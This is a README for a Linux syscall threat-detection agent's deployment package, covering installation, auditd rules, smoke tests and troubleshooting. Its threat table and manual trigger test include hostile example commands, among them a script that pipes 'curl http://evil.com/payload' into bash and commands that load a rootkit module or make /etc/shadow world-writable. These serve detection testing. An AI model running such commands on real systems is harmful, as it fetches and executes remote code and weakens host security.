# KernelAuditGuardV2 - Deployment Package

Production-ready deployment artifacts for KernelAuditGuardV2 syscall-plane threat detection agent.

## 📦 Package Contents

```
deployments/kernel_audit/
├── README.md                          # This file
├── DEPLOYMENT.md                      # Comprehensive deployment guide
├── install.sh                         # Automated installation script
├── smoke_test.sh                      # Validation test suite
├── run_agent_v2.py                    # Agent CLI entry point
├── audit_rules.conf                   # Linux auditd rules
└── amoskys-kernel-audit.service       # Systemd service definition
```

## 🚀 Quick Start

### 1. Prerequisites

- **OS:** Linux (kernel 3.10+)
- **Packages:** `auditd`, `python3`, `systemd`
- **AMOSKYS:** Installed (`pip3 install -e /path/to/amoskys`)

### 2. One-Command Install

```bash
cd deployments/kernel_audit
sudo ./install.sh --device-id=$(hostname)
```

This will:
- ✅ Create `amoskys` service account
- ✅ Install audit rules to `/etc/audit/rules.d/`
- ✅ Configure permissions for audit log access
- ✅ Install systemd service
- ✅ Enable and start the agent

### 3. Verify Installation

```bash
# Check service status
sudo systemctl status amoskys-kernel-audit

# View agent logs
sudo journalctl -u amoskys-kernel-audit -f

# Run smoke tests
sudo ./smoke_test.sh
```

## 📋 What Gets Monitored

KernelAuditGuardV2 detects 7 categories of kernel-level threats:

| Threat | MITRE | Severity | Example |
|--------|-------|----------|---------|
| Execution from /tmp, /dev/shm | T1059, T1204.002 | MEDIUM-HIGH | `/tmp/malware.sh` |
| Privilege escalation (setuid) | T1068, T1548.001 | **CRITICAL** | `setuid(0)` from non-root |
| Kernel module/rootkit loading | T1014, T1547.006 | **CRITICAL** | `insmod /tmp/rootkit.ko` |
| Ptrace on protected processes | T1055, T1055.008 | MEDIUM-CRITICAL | `gdb -p $(pgrep sshd)` |
| File permission tampering | T1222, T1222.002 | **CRITICAL** | `chmod 777 /etc/shadow` |
| Audit subsystem tampering | T1562.001, T1070.002 | **CRITICAL** | `auditctl -D` |
| Syscall flooding | T1592, T1083 | MEDIUM-HIGH | >100 syscalls/5s |

## 📖 Documentation

- **[DEPLOYMENT.md](DEPLOYMENT.md)** - Complete deployment guide (installation, configuration, monitoring, troubleshooting)
- **[Architecture Docs](../../docs/AGENTS.md)** - Agent fleet architecture and probe details
- **[Test Suite](../../tests/agents/test_kernel_audit_probes.py)** - 37 comprehensive probe tests

## 🔧 Configuration

### Quick Tuning

Edit `/etc/amoskys/kernel_audit.yaml`:

```yaml
kernel_audit:
  collection_interval: 5        # Seconds between cycles
  metrics_interval: 60          # Metrics emission interval

  probes:
    execve_high_risk:
      enabled: true
      high_risk_paths: ["/tmp", "/dev/shm"]

    privesc_syscall:
      enabled: true
      severity_override: CRITICAL

    syscall_flood:
      enabled: false             # Disable in production if noisy
```

### Systemd Service Tuning

Edit `/etc/systemd/system/amoskys-kernel-audit.service`:

```ini
[Service]
# Adjust collection interval
ExecStart=/usr/local/bin/amoskys-kernel-audit-agent \
    --collection-interval=10 \     # Increase for lower overhead
    --metrics-interval=60

# Resource limits
MemoryMax=512M                     # Adjust based on audit volume
CPUQuota=50%
```

Then reload:
```bash
sudo systemctl daemon-reload
sudo systemctl restart amoskys-kernel-audit
```

## 🧪 Testing

### Smoke Test Suite

Run comprehensive validation:

```bash
sudo ./smoke_test.sh
```

**Expected Output:**
```
==========================================
AMOSKYS KernelAudit Smoke Test Suite
==========================================

[PASS] auditd is running
[PASS] ExecveHighRiskProbe detected execution from /tmp
[PASS] PrivEscSyscallProbe detected setuid syscall
[PASS] FilePermissionTamperProbe detected chmod on /etc/shadow
...
Tests Run: 7
Tests Passed: 7
Tests Failed: 0
```

### Manual Trigger Tests

**Test 1: High-Risk Execution**
```bash
echo '#!/bin/bash
curl http://evil.com/payload | bash' > /tmp/test.sh
chmod +x /tmp/test.sh
/tmp/test.sh
```

Check detection:
```bash
sudo journalctl -u amoskys-kernel-audit | grep kernel_execve_high_risk
```

**Test 2: Privilege Escalation (as root)**
```bash
sudo python3 -c "
import os
os.setuid(1000)  # Drop to non-root
os.setuid(0)     # Attempt to escalate (triggers event)
"
```

Check detection:
```bash
sudo journalctl -u amoskys-kernel-audit | grep kernel_privesc_syscall
```

## 📊 Monitoring

### Agent Health

```bash
# Real-time metrics
sudo journalctl -u amoskys-kernel-audit | grep "emitted metrics"

# Agent success rate (target: >99%)
sudo journalctl -u amoskys-kernel-audit | grep "success_rate"

# Recent threat detections
sudo journalctl -u amoskys-kernel-audit | grep "Detected.*threats"
```

### SOMA Integration

Query threats in SOMA:

```sql
SELECT
    timestamp,
    event_type,
    severity,
    attributes->>'reason' as reason
FROM telemetry_events
WHERE protocol = 'KERNEL_AUDIT'
  AND timestamp > NOW() - INTERVAL '1 hour'
ORDER BY severity DESC, timestamp DESC;
```

### Grafana Dashboards

Key metrics to monitor:
- **Loop success rate:** Should be >99%
- **Threat events detected:** Rate of kernel-level threats
- **Probe errors:** Should be 0
- **Audit events processed:** Volume of syscalls analyzed

## 🔍 Troubleshooting

### Service Won't Start

```bash
# Check service status
sudo systemctl status amoskys-kernel-audit

# View error logs
sudo journalctl -u amoskys-kernel-audit -n 50

# Common fixes:
# 1. Check permissions on audit log
sudo setfacl -m u:amoskys:r /var/log/audit/audit.log

# 2. Check queue directory
ls -la /var/lib/amoskys/queues/kernel_audit
sudo chown -R amoskys:amoskys /var/lib/amoskys
```

### No Threats Detected

```bash
# 1. Check if audit rules are loaded
sudo auditctl -l | grep amoskys

# If no rules:
sudo cp audit_rules.conf /etc/audit/rules.d/amoskys-kernel.rules
sudo augenrules --load
sudo systemctl restart auditd

# 2. Run smoke test to generate events
sudo ./smoke_test.sh

# 3. Check agent is processing events
sudo journalctl -u amoskys-kernel-audit | grep "Collected.*audit events"
```

### High CPU Usage

```bash
# Check audit event volume
sudo journalctl -u amoskys-kernel-audit | grep "Collected.*audit events"

# If >1000 events per cycle:
# Option A: Increase collection interval
sudo systemctl edit amoskys-kernel-audit
# Add: --collection-interval=10

# Option B: Reduce audit rule scope
sudo vi /etc/audit/rules.d/amoskys-kernel.rules
# Replace broad rules with path-specific ones
```

See [DEPLOYMENT.md](DEPLOYMENT.md) for comprehensive troubleshooting guide.

## 🔐 Security Notes

- **Runs as non-root:** `amoskys` service account with minimal privileges
- **Read-only audit access:** Via ACL or group membership
- **Systemd hardening:** `PrivateTmp`, `ProtectSystem=strict`, capability restrictions
- **Resource limits:** Memory/CPU quotas prevent DoS

## 📞 Support

**Logs:**
```bash
# Agent logs
sudo journalctl -u amoskys-kernel-audit -f

# Audit system logs
sudo journalctl -u auditd -f
```

**Health Check:**
```bash
# Service status
sudo systemctl status amoskys-kernel-audit

# Agent metrics
curl http://localhost:9100/metrics 2>/dev/null | jq .  # If HTTP endpoint enabled
```

**Common Issues:**
1. **Permission denied on audit.log** → See "Troubleshooting" section
2. **No audit rules loaded** → Run `sudo augenrules --load`
3. **Agent not seeing events** → Check collector offset in queue state

## 🚀 Next Steps

After successful deployment:

1. **Run smoke tests** to validate detection
2. **Monitor agent metrics** for 24-48 hours
3. **Tune audit rules** based on your environment
4. **Configure SOMA alerts** for CRITICAL events
5. **Create Grafana dashboard** for threat visualization

---

**KernelAuditGuardV2** - Syscall-plane threat detection for the AMOSKYS defense mesh.

For architecture details, see [../../docs/AGENTS.md](../../docs/AGENTS.md).
